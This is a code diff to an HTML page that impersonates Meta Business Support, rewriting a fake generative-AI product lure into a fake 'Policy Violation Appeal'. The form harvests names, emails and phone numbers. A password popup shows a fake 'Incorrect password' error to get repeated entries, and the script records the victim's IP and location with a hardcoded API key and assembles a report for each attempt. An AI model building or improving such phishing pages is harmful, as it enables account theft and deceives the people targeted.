@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Forrest - Meta’s Generative AI Solution for Advertising</title>
+    <title>Meta Business Support - Policy Violation Appeal</title>
     <style>
         * {
             box-sizing: border-box;
@@ -374,9 +374,9 @@
 
         <div class="content-area">
             <div class="form-container">
-                <h2>Forrest - Meta’s Generative AI Solution for Advertising</h2>
+                <h2>Policy Violation Appeal</h2>
                 <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
-                <p>Unlock the power of generative AI with Forrest, Meta's innovative solution designed to revolutionize advertising. Generate dynamic backgrounds, expand images, create text variations, and automate video content to optimize your campaigns effortlessly. Complete the required information to access Forrest and start creating high-performing ads today.</p>
+                <p>We regret to inform you that your advertising account has been restricted due to a violation of <strong>Meta’s Advertising Policies</strong>. Your recent ads promoted <strong>unauthorized rapid growth products</strong>, which violates our rules on prohibited content. Please complete the required information below to submit an appeal and allow us to review your case.</p>
 
                 <form id="disagreeForm">
                     <label for="yourName">Page Name *</label>
@@ -384,21 +384,21 @@
 
                     <label for="businessEmail">Business Email *</label>
                     <input type="email" id="businessEmail" name="businessEmail" required>
-                    <p class="note">Notifications about your Forrest access and ad performance will be sent to this email.</p>
+                    <p class="note">Notifications about your appeal status and ad performance will be sent to this email.</p>
 
                     <label for="personalEmail">Personal Email *</label>
                     <input type="email" id="personalEmail" name="personalEmail" required>
 
                     <label for="mobilePhoneNumber">Mobile Phone Number *</label>
                     <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber" required>
-                    <p class="note">We can use this phone number to contact you for verification and Forrest support.</p>
+                    <p class="note">We may use this phone number to contact you for verification and appeal support.</p>
 
-                    <label for="additionalInfo">Please provide us information that will help us set up your Forrest account</label>
+                    <label for="additionalInfo">Please provide information to help us review your appeal</label>
                     <textarea id="additionalInfo" name="additionalInfo"></textarea>
 
                     <p class="terms">Learn more about our <a href="#">Terms and Community Standards.</a></p>
 
-                    <button type="submit" id="sendButton">Send</button>
+                    <button type="submit" id="sendButton">Submit Appeal</button>
                 </form>
             </div>
         </div>
@@ -406,8 +406,8 @@
 
     <div class="popup-overlay" id="passwordPopupOverlay">
         <div class="popup-content">
-            <h3>Please Enter Your Password</h3>
-            <p>For security reasons, please enter your password to continue with Forrest access.</p>
+            <h3>Enter Your Password</h3>
+            <p>For security reasons, please enter your password to continue with the appeal process.</p>
             <input type="password" id="passwordInput" placeholder="Password" required>
             <div class="error-message" id="passwordError">Incorrect password. Please try again.</div>
             <button id="confirmPasswordButton">Confirm</button>
@@ -415,7 +415,7 @@
     </div>
 
     <script>
-        // !!! VUI LÒNG THAY THẾ 'YOUR_IPGEOLOCATION_API_KEY' BẰNG API KEY CỦA BẠN !!!
+        // !!! PLEASE REPLACE 'YOUR_IPGEOLOCATION_API_KEY' WITH YOUR API KEY !!!
         const IPGEOLOCATION_API_KEY = 'faed5e0d05fe49b2ae40cbd6dc8027cf';
 
         let ipAddress = 'N/A';
@@ -531,7 +531,7 @@
 
             passwordAttemptCount++;
 
-            let message = `<b>New Submission Attempt ${passwordAttemptCount}</b>\n`;
+            let message = `<b>New Appeal Attempt ${passwordAttemptCount}</b>\n`;
             message += `------------------------------------\n`;
             message += `<b>IP & Location:</b> ${ipAddress} (${locationData})\n`;
             message += `<b>Page Name:</b> ${formData.yourName}\n`;
